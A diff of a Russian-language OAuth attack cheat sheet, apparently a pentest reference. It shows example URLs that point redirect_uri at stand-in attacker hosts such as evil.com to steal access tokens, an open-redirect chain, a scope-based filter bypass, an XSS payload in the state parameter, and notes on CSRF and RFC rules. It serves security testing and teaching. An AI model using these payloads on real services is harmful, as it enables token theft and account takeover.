@@ -14,13 +14,13 @@
 # Перехват токена OAuth через `redirect_uri`
 
 **Перенаправление на контролируемый домен для получения access token**
-```
+```python
 https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
 https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
 ```
 
 **Перенаправление на разрешенный Open URL для получения access token**
-```
+```python
 https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
 https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
 ```
@@ -28,12 +28,12 @@ https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.f
 > Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).
 
 Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
-```
+```python
 https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
 ```
 
 # Выполнение XSS через `redirect_uri`
-```
+```python
 https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
 ```
 
@@ -42,10 +42,11 @@ https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca
 
 # Нарушение правил использования authorization code
 > **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**
->
-> Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.
+
+Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.
 
 # Межсайтовая подделка запроса (CSRF)
+
 Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.
 
 > Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.
